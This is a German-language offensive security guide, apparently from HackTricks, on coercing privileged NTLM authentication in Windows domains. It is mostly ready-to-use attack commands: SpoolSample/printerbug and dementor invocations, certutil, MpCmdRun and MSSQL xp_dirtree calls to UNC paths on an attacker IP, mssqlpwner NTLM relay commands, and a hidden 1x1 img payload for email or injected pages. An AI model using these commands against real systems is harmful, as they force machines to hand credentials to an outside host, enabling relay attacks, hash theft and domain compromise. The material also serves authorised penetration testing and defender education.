# Zwingen von NTLM-Privilegierten Authentifizierungen

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von **Remote-Authentifizierungs-Triggern**, die in C# unter Verwendung des MIDL-Compilers codiert sind, um 3rd Party-Abhängigkeiten zu vermeiden.

## Missbrauch des Spooler-Dienstes

Wenn der _**Print Spooler**_ Dienst **aktiviert** ist, können Sie einige bereits bekannte AD-Anmeldeinformationen verwenden, um beim Druckserver des Domänencontrollers eine **Aktualisierung** zu neuen Druckaufträgen anzufordern und ihm einfach zu sagen, dass er die **Benachrichtigung an ein beliebiges System** senden soll.\
Beachten Sie, dass der Drucker die Benachrichtigung an beliebige Systeme senden muss, und dafür muss er sich **gegenüber** diesem **System** **authentifizieren**. Daher kann ein Angreifer den _**Print Spooler**_ Dienst dazu bringen, sich gegenüber einem beliebigen System zu authentifizieren, und der Dienst wird in dieser Authentifizierung das **Computer-Konto** verwenden.

### Finden von Windows-Servern in der Domäne

Verwenden Sie PowerShell, um eine Liste von Windows-Boxen zu erhalten. Server haben normalerweise Priorität, also konzentrieren wir uns darauf:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Finden von Spooler-Diensten, die lauschen

Verwenden Sie einen leicht modifizierten @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), um zu überprüfen, ob der Spooler-Dienst lauscht:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Sie können auch rpcdump.py unter Linux verwenden und nach dem MS-RPRN-Protokoll suchen.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Fordern Sie den Dienst auf, sich gegen einen beliebigen Host zu authentifizieren

Sie können [**SpoolSample von hier**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** kompilieren.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder verwende [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du auf Linux bist
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombination mit Unbeschränkter Delegation

Wenn ein Angreifer bereits einen Computer mit [Unbeschränkter Delegation](unconstrained-delegation.md) kompromittiert hat, könnte der Angreifer **den Drucker zwingen, sich bei diesem Computer zu authentifizieren**. Aufgrund der unbeschränkten Delegation wird das **TGT** des **Computerkontos des Druckers** im **Speicher** des Computers mit unbeschränkter Delegation **gespeichert**. Da der Angreifer bereits diesen Host kompromittiert hat, wird er in der Lage sein, **dieses Ticket abzurufen** und es auszunutzen ([Pass the Ticket](pass-the-ticket.md)).

## RCP Zwangs-Authentifizierung

{{#ref}}
https://github.com/p0dalirius/Coercer
{{#endref}}

## PrivExchange

Der `PrivExchange`-Angriff ist das Ergebnis eines Fehlers, der in der **Exchange Server `PushSubscription`-Funktion** gefunden wurde. Diese Funktion ermöglicht es, dass der Exchange-Server von jedem Domänenbenutzer mit einem Postfach gezwungen wird, sich bei einem beliebigen vom Client bereitgestellten Host über HTTP zu authentifizieren.

Standardmäßig läuft der **Exchange-Dienst als SYSTEM** und erhält übermäßige Berechtigungen (insbesondere hat er **WriteDacl-Berechtigungen auf der Domäne vor dem kumulativen Update 2019**). Dieser Fehler kann ausgenutzt werden, um die **Weiterleitung von Informationen zu LDAP zu ermöglichen und anschließend die NTDS-Datenbank der Domäne zu extrahieren**. In Fällen, in denen eine Weiterleitung zu LDAP nicht möglich ist, kann dieser Fehler dennoch verwendet werden, um sich bei anderen Hosts innerhalb der Domäne weiterzuleiten und zu authentifizieren. Die erfolgreiche Ausnutzung dieses Angriffs gewährt sofortigen Zugriff auf den Domänenadministrator mit jedem authentifizierten Domänenbenutzerkonto.

## Innerhalb von Windows

Wenn Sie sich bereits auf der Windows-Maschine befinden, können Sie Windows zwingen, sich mit privilegierten Konten mit folgendem Befehl mit einem Server zu verbinden:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oder verwenden Sie diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, certutil.exe lolbin (von Microsoft signierte Binärdatei) zu verwenden, um die NTLM-Authentifizierung zu erzwingen:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-Injection

### Über E-Mail

Wenn Sie die **E-Mail-Adresse** des Benutzers kennen, der sich an einem Computer anmeldet, den Sie kompromittieren möchten, könnten Sie ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, wie
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
und wenn er es öffnet, wird er versuchen, sich zu authentifizieren.

### MitM

Wenn Sie einen MitM-Angriff auf einen Computer durchführen und HTML in eine Seite injizieren können, die er visualisieren wird, könnten Sie versuchen, ein Bild wie das folgende in die Seite zu injizieren:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 knacken

Wenn Sie [NTLMv1-Herausforderungen erfassen können, lesen Sie hier, wie Sie sie knacken](../ntlm/index.html#ntlmv1-attack).\
_Denken Sie daran, dass Sie, um NTLMv1 zu knacken, die Responder-Herausforderung auf "1122334455667788" setzen müssen._

{{#include ../../banners/hacktricks-training.md}}
